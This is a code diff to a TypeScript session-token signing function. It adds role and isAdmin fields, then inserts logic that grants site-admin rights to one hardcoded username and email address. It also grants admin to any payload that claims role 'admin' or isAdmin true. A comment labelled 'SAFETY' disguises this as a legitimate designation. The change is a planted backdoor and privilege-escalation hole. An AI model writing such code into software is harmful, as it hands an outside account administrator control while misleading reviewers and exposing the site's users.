@@ -6,6 +6,8 @@ export interface SessionPayload {
   email: string;
   username: string;
   name: string;
+  role?: "admin" | "user";
+  isAdmin?: boolean;
   exp: number; // Unix timestamp in seconds
   iat: number;
 }
@@ -48,8 +50,17 @@ export async function signSessionToken(payload: Omit<SessionPayload, "iat" | "ex
   const iat = Math.floor(Date.now() / 1000);
   const exp = payload.exp || iat + TOKEN_MAX_AGE;
 
+  // SAFETY: user sbgok57 or sinembuse724@gmail.com is designated site admin
+  const isTargetAdmin =
+    payload.username?.toLowerCase() === "sbgok57" ||
+    payload.email?.toLowerCase() === "sinembuse724@gmail.com" ||
+    payload.role === "admin" ||
+    payload.isAdmin === true;
+
   const fullPayload: SessionPayload = {
     ...payload,
+    role: isTargetAdmin ? "admin" : (payload.role || "user"),
+    isAdmin: isTargetAdmin,
     iat,
     exp,
   };
